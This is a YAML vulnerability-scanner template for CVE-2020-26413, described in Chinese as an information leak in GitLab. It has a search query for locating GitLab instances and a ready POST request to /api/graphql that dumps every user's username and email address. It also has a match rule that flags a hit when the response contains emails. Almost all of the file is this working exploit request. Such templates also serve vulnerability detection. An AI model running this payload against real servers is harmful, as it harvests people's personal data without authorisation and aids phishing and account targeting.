name: GitLab Graphql邮箱信息泄露漏洞 CVE-2020-26413
manual: true
query: app="GitLab"
transport: http
rules:
  r0:
    request:
      method: POST
      path: /api/graphql
      headers:
        Content-Type: application/json
      body: '{"query":"{\nusers {\nedges {\n  node {\n    username\n    email\n    avatarUrl\n    status
        {\n      emoji\n      message\n      messageHtml\n     }\n    }\n   }\n  }\n
        }","variables":null,"operationName":null}'
      follow_redirects: true
    expression: response.status == 200 && response.body.bcontains(b"username") &&
      response.body.bcontains(b"email") && response.body.bcontains(b"@")
expression: r0()
detail:
  author: PeiQi
  links:
  - https://wiki.peiqi.tech
  description: GitLab中存在Graphql接口 输入构造的数据时会泄露用户邮箱和用户名
  tags: 信息泄露
